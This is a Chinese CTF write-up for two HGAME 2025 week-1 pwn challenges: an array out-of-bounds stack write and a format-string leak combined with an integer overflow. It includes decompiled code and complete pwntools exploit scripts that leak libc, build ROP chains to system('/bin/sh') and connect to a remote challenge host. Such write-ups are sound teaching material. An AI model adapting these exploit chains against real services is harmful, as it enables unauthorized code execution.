---
title: "HGAMECTF 2025"
description: "HGAME 2025 week1 两题：数花瓣题的数组越界改 size/idx 拿栈任意写，format 题的整数溢出接 printf 泄露。"
pubDate: 2025-02-07
category: wp
tags: [writeup]
---

## week1

### counting petals

先看保护：
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
amd64 小端，保护全开。程序是个数花瓣的小游戏，文案很长。

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int ci;                        // [rsp+Ch] [rbp-A4h]
  int idx1;                      // [rsp+10h] [rbp-A0h]
  int rnum;                      // [rsp+14h] [rbp-9Ch]
  __int64 sum;                   // [rsp+18h] [rbp-98h] BYREF
  __int64 list[16];              // [rsp+20h] [rbp-90h] BYREF
  int size;                      // [rsp+A0h] [rbp-10h] BYREF
  int idx;                       // [rsp+A4h] [rbp-Ch]
  unsigned __int64 v11;          // [rsp+A8h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  init(argc, argv, envp);
  ci = 0;
  while ( 1 )
  {
    idx1 = 0;
    rnum = rand() % 30;
    idx = 0;
    puts("\nAs we know,there's a tradition to determine whether someone loves you or not...");
    puts("... by counting flower petals when u are not sure.");
    puts("\nHow many flowers have you prepared this time?");
    scanf("%d", &size);
    if ( size > 16 )
    {
      puts("\nNo matter how many flowers there are, they cannot change the fact of whether he or she loves you.");
      puts("Just a few flowers will reveal the answer,love fool.");
      exit(0);
    }
    puts("\nTell me the number of petals in each flower.");
    while ( idx < size )
    {
      printf("the flower number %d : ", ++idx);
      scanf("%ld", &list[idx]);  // 0   1   list[1]
                                 // ...
                                 // 16  17  list[17]
    }
    puts("\nDo you want to start with 'love me'");
    puts("...or 'not love me'?");
    puts("Reply 1 indicates the former and 2 indicates the latter: ");
    scanf("%ld", &sum);
    puts("\nSometimes timing is important, so I added a little bit of randomness.");
    puts("\nLet's look at the results.");
    while ( idx1 < size )
    {
      printf("%ld + ", list[++idx1]);
      sum += list[idx1];
    }
    printf("%d", rnum);
    sum += rnum;
    puts(" = ");
    if ( (sum & 1) == 0 )
      break;
    puts("He or she doesn't love you.");
    if ( ci > 0 )
      return 0;
    ++ci;
    puts("What a pity!");
    puts("I can give you just ONE more chance.");
    puts("Wish that this time they love you.");
  }
  puts("Congratulations,he or she loves you.");
  return 0;
}
```
`list` 声明成 `int64_t[16]`，但读入用 `idx < size` 控制、`size` 允许到 16，写到 `list[17]` 就压到了紧邻的 `idx` 和 `size` 上——数组越界。改写这两个变量，就能在栈上任意写。先试一下：
```python
#先将size设置成16,才能溢出
io.recvuntil(b'How many flowers have you prepared this time?')
io.sendline(b'16')

#填充list[1]-list[16]
for i in range(15):
    io.recvuntil(b'the flower number ')
    io.sendline(b'20')

#list[17]也就是size和idx
#因为list是int64的数组,而size和idx都是int类型
io.recvuntil(b'the flower number ')

#前4个字节是idx,这里设置成了-4
#后四个字节是size,这里设置成了0x14
t=0x7ffffffc00000014-0x8000000000000000
io.sendline(str(t).encode())
```
`idx` 设成 -4 后，`++idx` 让下一次写入落在 `list[-3]`，也就是 `ci` 的位置。本来想借此控制 `rnum`，但它每轮都会重新随机，所以 `idx` 其实不必设成负数。

把 `size` 调大还能顺带泄露栈内容——比如 `main` 的返回地址 `__libc_start_call_main+128`，据此算出 libc 基址。

```python
for i in range(4+15):
    io.recvuntil(b'the flower number ')
    io.sendline(b'0')

#这里将size和idx设置成了相同值,就结束了读入循环
t=0x2000000020
io.recvuntil(b'the flower number ')
io.sendline(str(t).encode())

io.recvuntil(b'Reply 1 indicates the former and 2 indicates the latter: ')
io.sendline(b'1')

io.recvuntil(b'Let\'s look at the results.\n')
enc=list(map(int,io.recvline()[:-3].decode().replace(' ','').split('+')))
print(enc)

#泄露libc地址,从而
libc_start_main=enc[18]-128
print(hex(libc_start_main))
libc_base = libc_start_main-0x29d10
log.success('libc_base: '+hex(libc_base))
system=libc_base+libc.symbols['system']
binsh=libc_base+next(libc.search(b'/bin/sh'))
```

第二轮再调 `idx` / `size`，让下一次写入正好落在 `rbp+8`，直接 ROP。

```python
#先将size设置成16,才能溢出
io.recvuntil(b'How many flowers have you prepared this time?')
io.sendline(b'16')

#填充数据
for i in range(15):
    io.recvuntil(b'the flower number ')
    io.sendline(b'20')

#将size和idx设置为合适的值,使得下一个读入的位置就是rbp+8
t=0x1200000016
io.recvuntil(b'the flower number ')
io.sendline(str(t).encode())

#ROP写法
io.recvuntil(b'the flower number ')
io.sendline(str(libc_base+0x29139).encode())

io.recvuntil(b'the flower number ')
io.sendline(str(libc_base+0x2a3e5).encode())

io.recvuntil(b'the flower number ')
io.sendline(str(binsh).encode())

io.recvuntil(b'the flower number ')
io.sendline(str(system).encode())
```
就到手了。完整 exp：
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

libc=ELF('./libc.so.6')

addr = 'xxxx:xxxxx'.split(':')
io = remote(addr[0], addr[1])
# io=process('./vuln')
# gdb.attach(io, 'b *$rebase(0x13c8)')

io.recvuntil(b'How many flowers have you prepared this time?')

io.sendline(b'16')

for i in range(15):
    io.recvuntil(b'the flower number ')
    io.sendline(b'20')

io.recvuntil(b'the flower number ')

t=0x7ffffffc00000014-0x8000000000000000

io.sendline(str(t).encode())

for i in range(4+15):
    io.recvuntil(b'the flower number ')
    io.sendline(b'0')

t=0x2000000020
io.recvuntil(b'the flower number ')
io.sendline(str(t).encode())

io.recvuntil(b'Reply 1 indicates the former and 2 indicates the latter: ')
io.sendline(b'1')

io.recvuntil(b'Let\'s look at the results.\n')
enc=list(map(int,io.recvline()[:-3].decode().replace(' ','').split('+')))
print(enc)

libc_start_main=enc[18]-128
print(hex(libc_start_main))
libc_base = libc_start_main-0x29d10
log.success('libc_base: '+hex(libc_base))
system=libc_base+libc.symbols['system']
binsh=libc_base+next(libc.search(b'/bin/sh'))

io.recvuntil(b'How many flowers have you prepared this time?')

io.sendline(b'16')

for i in range(15):
    io.recvuntil(b'the flower number ')
    io.sendline(b'20')

t=0x1200000016
io.recvuntil(b'the flower number ')
io.sendline(str(t).encode())

io.recvuntil(b'the flower number ')
io.sendline(str(libc_base+0x29139).encode())

io.recvuntil(b'the flower number ')
io.sendline(str(libc_base+0x2a3e5).encode())

io.recvuntil(b'the flower number ')
io.sendline(str(binsh).encode())

io.recvuntil(b'the flower number ')
io.sendline(str(system).encode())

io.recvuntil(b'Reply 1 indicates the former and 2 indicates the latter: ')
io.sendline(b'1')

io.interactive()
```

### format

先看保护：
```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
amd64 小端，PIE 和 canary 都没开。程序很短：
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char format[4];  // [rsp+0h] [rbp-10h] BYREF
  int v5;          // [rsp+4h] [rbp-Ch] BYREF
  int v6;          // [rsp+8h] [rbp-8h] BYREF
  int i;           // [rsp+Ch] [rbp-4h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  printf("you have n chance to getshell\n n = ");
  if ( (int)scanf("%d", &v6) <= 0 )
    exit(1);
  for ( i = 0; i < v6; ++i )
  {
    printf("type something:");
    if ( (int)scanf("%3s", format) <= 0 )
      exit(1);
    printf("you type: ");
    printf(format);
  }
  printf("you have n space to getshell(n<5)\n n = ");
  scanf("%d\n", &v5);
  if ( v5 <= 5 )
    vuln((unsigned int)v5);
  return 0;
}

ssize_t __fastcall vuln(unsigned int a1)
{
  _BYTE buf[4];    // [rsp+1Ch] [rbp-4h] BYREF

  printf("type something:");
  return read(0, buf, a1);
}
```

本来想用 `printf(format)` 直接打格式化字符串，但 `format` 只有 4 字节，凑不出有用的格式串，先泄露一个栈地址。顺手看整数溢出：`v5` 输入 -1，传给 `read` 的长度就变成极大值。
```python
io.recvuntil(b'n = ')
io.sendline(b'1')

io.recvuntil(b'type something:')
io.sendline("%p")

io.recvuntil(b'0x')
buf = int(io.recvuntil(b'y', drop=True), 16)+0x2138+0x10

log.success(f'buf: {hex(buf)}')

io.recvuntil(b'n = ')
io.send(b'-1')
```
接着构造栈，跳回 `printf(format)` 泄露 libc：
```python
#这里覆盖了rbp,控制了栈帧
payload = b'a'*5+p64(buf-0x18)+p64(0x4012CF)+b'%3$p'
io.send(payload)

#泄露了libc地址
io.recvuntil(b'0x')

read_addr = int(io.recvuntil(b'\xff', drop=True), 16)-18
log.success(f'read_addr: {hex(read_addr)}')
libc_base = read_addr-libc.sym['read']
log.success(f'libc_base: {hex(libc_base)}')

ret = libc_base+0x29139
log.success(f'ret: {hex(ret)}')
rdi = libc_base+0x2a3e5
log.success(f'rdi: {hex(rdi)}')
system = libc_base+libc.sym['system']
log.success(f'system: {hex(system)}')
binsh = libc_base+next(libc.search(b'/bin/sh'))
log.success(f'binsh: {hex(binsh)}')
```

再来一遍，这次直接覆盖返回地址 ROP：
```python
payload = b'a'*4+p64(buf-0x18)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)
io.sendline(payload)

io.interactive()
```
flag 到手。完整 exp：
```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')
elf = ELF('./vuln')
bss = 0x404050

# io = process('./vuln')
# gdb.attach(io, 'b *0x4011CC')

addr = 'node1.hgame.vidar.club:31733'.split(':')
io = remote(addr[0], addr[1])

io.recvuntil(b'n = ')
io.sendline(b'1')

io.recvuntil(b'type something:')
io.sendline("%p")

io.recvuntil(b'0x')
buf = int(io.recvuntil(b'y', drop=True), 16)+0x2138+0x10

log.success(f'buf: {hex(buf)}')

io.recvuntil(b'n = ')
io.send(b'-1')

# io.recvuntil(b'type something:')
payload = b'a'*5+p64(buf-0x18)+p64(0x4012CF)+b'%3$p'
io.send(payload)

io.recvuntil(b'0x')

read_addr = int(io.recvuntil(b'\xff', drop=True), 16)-18
log.success(f'read_addr: {hex(read_addr)}')
libc_base = read_addr-libc.sym['read']
log.success(f'libc_base: {hex(libc_base)}')

ret = libc_base+0x29139
log.success(f'ret: {hex(ret)}')
rdi = libc_base+0x2a3e5
log.success(f'rdi: {hex(rdi)}')
system = libc_base+libc.sym['system']
log.success(f'system: {hex(system)}')
binsh = libc_base+next(libc.search(b'/bin/sh'))
log.success(f'binsh: {hex(binsh)}')

payload = b'a'*4+p64(buf-0x18)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)
io.sendline(payload)

io.interactive()
```
